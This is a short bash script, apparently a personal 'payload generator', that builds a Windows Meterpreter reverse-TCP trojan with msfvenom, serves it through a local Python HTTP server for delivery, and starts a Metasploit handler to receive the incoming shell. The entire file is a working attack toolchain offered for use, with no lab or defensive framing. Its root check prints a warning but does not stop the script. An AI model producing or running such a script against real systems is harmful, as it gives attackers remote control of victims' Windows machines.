#!/bin/bash 

# Author: Topaz Daniel
# Project: Payload generator
# Description: Automated payload generator and listener setup using Msfvenom, Msfconsole, and a local HTTP server for delivery.

#Check if root (sudo) 
if [ "$(whoami)" != "root" ]
then
	echo "Exiting .. not root" 
fi	

# Creat a trojan 

read -p "Please enter a port: " PORT 
msfvenom -p windows/meterpreter/reverse_tcp lhost=$(hostname -I) lport=$PORT -f exe -o rev$PORT.exe

# Creat a listen.rc 
echo "
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp 
set lhost $(hostname -I)
set lport $PORT
run
" > listen.rc 

# Http server 
python3 -m http.server &     # & = Run back stage ...  

# In hardwares --> ps , and then Kill process with --> kill -9 <process number
 
# In order to kill --> sudo netstat -tpan | grep "LISTEN" | awk '{print $7}' | cut -d '/' -f 1

# Msfconsole 
msfconsole -q -r listen.rc 

